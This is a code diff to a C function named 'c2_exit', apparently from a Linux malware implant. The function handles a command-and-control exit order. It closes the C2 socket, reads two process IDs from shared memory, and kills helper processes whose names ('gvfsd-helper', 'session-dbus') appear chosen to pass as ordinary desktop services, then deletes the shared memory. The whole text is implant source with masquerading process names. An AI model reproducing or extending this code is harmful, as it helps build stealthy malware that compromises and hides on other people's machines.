@@ -28,7 +28,7 @@ void c2_exit(char *cmd_id, int sock) {
     close(sock);
 
     // get pids from sharedmem and kill both pids
-    int shmid = shmget(0x64b2e2, 8, 0666);
+    int shmid = shmget(0x64b2e2, 0, 0666);
 
     // if handled on sharedmem cannot be obtained
     if (shmid == -1) {
@@ -38,29 +38,29 @@ void c2_exit(char *cmd_id, int sock) {
         exit(0);
     }
 
+
     int *shmem_pid_addr = (int *)shmat(shmid, NULL, 0);
     int *gvfsd_pid = (int *)malloc(4);
     int *sessiondbus_pid = (int *)malloc(4);
 
-    pthread_kill(gettid()+1, 9);
+    // Get gvfsd-helper pid from sharedmem  and kill it
+    memset(gvfsd_pid, 0, 4);
+    memcpy(gvfsd_pid, shmem_pid_addr, 4);
+    kill(*gvfsd_pid, SIGKILL);
 
     // Get session-dbus pid from sharedmem and kill it
     memset(sessiondbus_pid, 0, 4);
     memcpy(sessiondbus_pid, shmem_pid_addr+4, 4);
+    #ifdef DEBUG
+    printf("Killing %d\n", *sessiondbus_pid);
+    #endif
+    // REALLY need to kill this...
     kill(*sessiondbus_pid, SIGKILL);
-    int shmres = shmdt(&shmid);
 
-    if (shmres != 0) {
-        #ifdef DEBUG
-        fprintf(stderr,"Error obtaining shared mem handle!");
-        #endif
-    }
-
-    // Get gvfsd-helper pid from sharedmem  and kill it
-    memset(gvfsd_pid, 0, 4);
-    memcpy(gvfsd_pid, shmem_pid_addr, 4);
-    kill(*sessiondbus_pid, SIGKILL);
-    kill(*gvfsd_pid, SIGKILL);
+    shmctl(shmid, IPC_RMID, NULL);
+    #ifdef DEBUG
+    printf("Deleting shared memory ID\n");
+    #endif
 
     // we won't reach this...
     free(sessiondbus_pid);
